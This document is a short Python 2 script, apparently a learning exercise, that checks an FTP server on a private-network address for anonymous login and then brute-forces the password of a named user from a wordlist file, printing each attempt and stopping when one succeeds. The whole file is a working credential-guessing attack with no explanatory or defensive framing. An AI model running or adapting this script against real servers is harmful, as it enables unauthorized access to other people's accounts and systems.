import ftplib

def connect(host,user,password):
  try:
    ftp = ftplib.FTP(host)
    ftp.login(user,password)
    ftp.quit()
    return True
  except:
    return False

def main():
  # Variables
  targetHostAddress = '192.168.0.103'
  userName = 'kuntu'
  passwordsFilePath = 'passwords.txt'

  # try to connect using anonymous credentials
  print '[+] Using anonymous credentials for ' + targetHostAddress
  if connect(targetHostAddress,'anonymous','test@test.com'):
    print '[+] FTP Anonymous log on succeeded on host' + targetHostAddress
  else:
    print '[+] FTP Anonymous log on failed on host' + targetHostAddress

    # try brute force with dictionary file
    passwordsFile = open(passwordsFilePath,'r')
 
    for line in passwordsFile.readlines():
      # clean the lines in dic file
      password = line.strip('\r').strip('\n')
      print "Testing: " + str(password)

      if connect(targetHostAddress,userName,password):
        # pass found
        print "[*] FTP Logon succeeded on host " + targetHostAddress + " UserName: " + userName  + " Password: " + password
        exit(0)
      else:
        # pass not found
        print "[*] FTP Logon failed on host " + targetHostAddress + " UserName: " + userName  + " Password: " + password
    

if __name__ == "__main__":
  main()
